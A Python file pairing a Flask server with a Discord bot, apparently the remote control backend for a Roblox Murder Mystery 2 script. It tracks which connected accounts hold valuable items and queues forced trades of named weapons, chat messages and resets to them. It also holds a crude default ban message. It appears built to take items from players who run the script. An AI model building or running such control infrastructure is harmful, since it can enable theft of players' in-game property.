import os
import threading
import time
import json
import discord
from discord.ext import commands
from dotenv import load_dotenv
from flask import Flask, jsonify, request
import requests

# Carga las variables de entorno
load_dotenv()

# ==========================================
# CONFIGURACIÓN DE BANOS PERSISTENTES (JSON)
# ==========================================
BANS_FILE = "bans.json"

def cargar_bans():
    if os.path.exists(BANS_FILE):
        try:
            with open(BANS_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def guardar_bans(diccionario_bans):
    try:
        with open(BANS_FILE, "w") as f:
            json.dump(diccionario_bans, f, indent=4)
    except Exception as e:
        print(f"Error al guardar los baneos: {e}")

usuarios_baneados = cargar_bans()

# ==========================================
# CONFIGURACIÓN DE WEBHOOK DESDE ENTORNO
# ==========================================
WEBHOOK_ACTIVOS_URL = os.getenv("WEBHOOK_ACTIVOS_URL", "")
MESSAGE_ID_ACTIVOS = os.getenv("MESSAGE_ID_ACTIVOS", "")

# ==========================================
# 1. SERVIDOR WEB (FLASK) Y PANEL DE ACTIVOS
# ==========================================
app = Flask(__name__)

comandos_activos = {}
cuentas_activas = {}


@app.route("/")
def home():
  return "El servidor de RysHub (MM2) está activo y en línea."


@app.route("/check", methods=["GET"])
def check_commands():
  ahora = time.time()
  comandos_validos = []

  for cmd_id, info in list(comandos_activos.items()):
    if ahora - info["timestamp"] < 10:
      comandos_validos.append(info["comando"])
    else:
      comandos_activos.pop(cmd_id, None)

  return jsonify({"commands": comandos_validos})


@app.route("/heartbeat", methods=["POST"])
def heartbeat():
  data = request.json
  if data and "username" in data:
    username = data["username"].strip().lower()
    
    if username in usuarios_baneados:
        razon = usuarios_baneados[username]
        return jsonify({"status": "banned", "reason": razon}), 403

    tiene_valiosos = data.get("tiene_valiosos", False)
    cuentas_activas[username] = {
        "time": time.time(),
        "tiene_valiosos": tiene_valiosos,
    }
  return jsonify({"status": "ok"})


def run_flask():
  puerto = int(os.environ.get("PORT", 3000))
  app.run(host="0.0.0.0", port=puerto)


# ==========================================
# TAREA EN SEGUNDO PLANO: PANEL DE ACTIVOS
# ==========================================
def bucle_actualizar_panel():
  if not WEBHOOK_ACTIVOS_URL or not MESSAGE_ID_ACTIVOS:
    return

  while True:
    time.sleep(10)
    try:
      ahora = time.time()
      fuera = [
          usr for usr, info in cuentas_activas.items() if ahora - info["time"] > 60
      ]
      for usr in fuera:
        cuentas_activas.pop(usr, None)

      lineas_cuentas = []
      for usr, info in sorted(cuentas_activas.items()):
        fuego = "🔥 " if info["tiene_valiosos"] else ""
        lineas_cuentas.append(f"• `{usr}` {fuego}(Activo)")

      if not lineas_cuentas:
        texto_cuentas = "(No hay cuentas conectadas actualmente)"
      else:
        texto_cuentas = "\n".join(lineas_cuentas)

      tiempo_actual = time.strftime("%H:%M:%S", time.localtime())

      embed = {
          "title": "🟢 Panel de Monitoreo de Bots Activos",
          "description": (
              "Estado en tiempo real de las cuentas ejecutando el script."
          ),
          "color": 65280,
          "fields": [{
              "name": f"Cuentas Online ({len(cuentas_activas)})",
              "value": texto_cuentas,
              "inline": False,
          }],
          "footer": {"text": f"Última actualización: {tiempo_actual}"},
      }

      payload = {"embeds": [embed]}
      url_patch = f"{WEBHOOK_ACTIVOS_URL}/messages/{MESSAGE_ID_ACTIVOS}"
      requests.patch(url_patch, json=payload, timeout=5)

    except Exception as e:
      pass


# ==========================================
# 2. BOT DE DISCORD Y COMANDOS
# ==========================================
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="-", intents=intents)


def registrar_comando(comando_dict):
  cmd_id = str(time.time())
  comandos_activos[cmd_id] = {"timestamp": time.time(), "comando": comando_dict}


@bot.event
async def on_ready():
  print(f"✅ Bot de Discord {bot.user} conectado correctamente!")


@bot.command()
async def trade(ctx, arma: str, bot_ejecutor: str):
  registrar_comando({
      "action": "forcetrade",
      "target_weapon": arma.strip().lower(),
      "target_player": bot_ejecutor.strip().lower(),
  })
  embed = discord.Embed(
      title="🎯 MODO ESTRICTO ACTIVADO",
      description=(
          f"La orden fue enviada a la cuenta **{bot_ejecutor}**.\n\nIgnorará su"
          f" inventario completo y pondrá **ÚNICAMENTE** el arma: `{arma}` en su"
          " próximo trade."
      ),
      color=discord.Color.green(),
  )
  await ctx.send(embed=embed)


@bot.command()
async def text(ctx, player: str, *, mensaje: str):
  registrar_comando({
      "action": "text",
      "message": mensaje,
      "target_player": player.strip().lower(),
  })
  await ctx.send(f"✅ Mensaje enviado a **{player}**: `{mensaje}`")


@bot.command()
async def reset(ctx, player: str = "all"):
  registrar_comando(
      {"action": "reset", "target_player": player.strip().lower()}
  )
  await ctx.send(f"🔄 Reiniciando el script para: **{player}**...")


@bot.command()
async def ban(ctx, usuario: str, *, razon: str = "Jajaja pendejo me pelas la verga"):
    user_clean = usuario.strip().lower()
    
    usuarios_baneados[user_clean] = razon
    guardar_bans(usuarios_baneados)
    
    embed = discord.Embed(
        title="🔨 USUARIO BANEADO",
        description=f"El usuario **{usuario}** ha sido baneado permanentemente.",
        color=discord.Color.red()
    )
    embed.add_field(name="Razón", value=razon, inline=False)
    await ctx.send(embed=embed)


@bot.command()
async def unban(ctx, usuario: str):
    user_clean = usuario.strip().lower()
    
    if user_clean in usuarios_baneados:
        usuarios_baneados.pop(user_clean)
        guardar_bans(usuarios_baneados)
        await ctx.send(f"✅ El usuario **{usuario}** ha sido desbaneado del script.")
    else:
        await ctx.send(f"⚠️ El usuario **{usuario}** no se encontraba en la lista de baneados.")


@bot.command()
async def banlist(ctx):
    if not usuarios_baneados:
        await ctx.send("📋 La lista de baneos está actualmente vacía.")
        return

    embed = discord.Embed(
        title="📋 Lista de Usuarios Baneados",
        color=discord.Color.orange()
    )
    
    descripcion = ""
    for usr, razon in usuarios_baneados.items():
        descripcion += f"• **{usr}**\n  ┗ *Razón:* {razon}\n\n"
    
    if len(descripcion) > 2000:
        descripcion = descripcion[:1990] + "..."

    embed.description = descripcion
    await ctx.send(embed=embed)


@text.error
async def text_error(ctx, error):
  if isinstance(error, commands.MissingRequiredArgument):
    await ctx.send("⚠️ **Uso incorrecto.** Formato requerido: `-text <player> <mensaje>`")


@trade.error
async def trade_error(ctx, error):
  if isinstance(error, commands.MissingRequiredArgument):
    await ctx.send("⚠️ **Uso incorrecto.** Formato requerido: `-trade <arma> <bot_ejecutor>`")


@ban.error
async def ban_error(ctx, error):
  if isinstance(error, commands.MissingRequiredArgument):
    await ctx.send("⚠️ **Uso incorrecto.** Formato requerido: `-ban <usuario> [razón]`")


@unban.error
async def unban_error(ctx, error):
  if isinstance(error, commands.MissingRequiredArgument):
    await ctx.send("⚠️ **Uso incorrecto.** Formato requerido: `-unban <usuario>`")


# ==========================================
# 3. EJECUCIÓN MULTIHILO (FLASK + BOT)
# ==========================================
if __name__ == "__main__":
  TOKEN = os.getenv("DISCORD_TOKEN")
  if not TOKEN:
    raise ValueError("❌ No se encontró el DISCORD_TOKEN en las variables.")

  threading.Thread(target=run_flask, daemon=True).start()
  threading.Thread(target=bucle_actualizar_panel, daemon=True).start()

  bot.run(TOKEN)
